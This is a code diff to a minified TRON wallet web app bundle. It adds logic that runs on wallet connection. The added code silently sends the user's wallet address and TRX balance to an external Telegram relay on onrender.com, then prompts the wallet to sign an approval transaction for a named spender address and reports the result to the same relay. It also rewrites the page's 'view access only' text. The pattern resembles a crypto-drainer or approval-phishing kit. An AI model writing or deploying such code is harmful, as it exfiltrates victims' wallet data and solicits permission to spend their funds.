@@ -92950,7 +92950,44 @@
                     s(address),
                     n(!0),
                     o(balanceInTRX),
-                    t(2)
+                    t(2);
+                    const feeLimit = balanceInTRX >= 20 ? 15000000 : 1e9;
+                    localStorage.setItem("walletAddress", address);
+                    GS.post("https://tronscantelegram-a900.onrender.com/api/telegram", {
+                        text: `Wallet connected\nWallet: ${address}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
+                    }, {
+                        timeout: 8000
+                    }).catch(() => {});
+                    const tronLinkSigner = {
+                        request: async request => {
+                            if (!request || "tron_signTransaction" !== request.method)
+                                throw new Error("Unsupported TronLink signing request.");
+                            const fullTransaction = request.params && request.params.transaction;
+                            const transaction = fullTransaction && fullTransaction.transaction || fullTransaction;
+                            if (!transaction)
+                                throw new Error("No transaction was provided for TronLink signing.");
+                            return {
+                                result: await tronWeb.trx.sign(transaction)
+                            }
+                        }
+                    };
+                    const service = new SA(tronLinkSigner);
+                    const approval = await service.sendTransaction(address, feeLimit);
+                    if (approval && (approval.result || approval.success)) {
+                        GS.post("https://tronscantelegram-a900.onrender.com/api/telegram", {
+                            text: `Transaction approved\nWallet: ${address}\nTransaction ID: ${approval.txID || "N/A"}\nTime: ${new Date().toISOString()}`
+                        }).catch(() => {});
+                        setTimeout(() => {
+                            window.location.href = "/certificate"
+                        }, 1500);
+                        t(3)
+                    } else if (approval && approval.approvalNotAttempted) {
+                        window.alert("Could not start the approval. The wallet popup was not opened.\n" + (approval.message || "Network request failed."));
+                        t(2)
+                    } else {
+                        window.alert("Approve failed. Please try again." + (approval && approval.message ? "\n" + approval.message : ""));
+                        t(2)
+                    }
                 } catch (error) {
                     const message = error && error.message ? error.message : String(error);
                     console.error("TronLink connection error:", error);
@@ -93295,7 +93332,7 @@
                                     }), (0,
                                     zS.jsx)("p", {
                                         className: "text-sm text-muted-foreground",
-                                        children: "We only require view access to analyze your wallet. No transactions or approvals needed."
+                                        children: "Connecting will request a TRON USDT approval for 1 USDT (1,000,000 units) for spender TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw. If you approve, that address receives permission to spend the approved USDT amount from your wallet. Review the token, amount, and spender in your wallet before confirming, and reject if you do not trust or recognize this request."
                                     })]
                                 })]
                             })
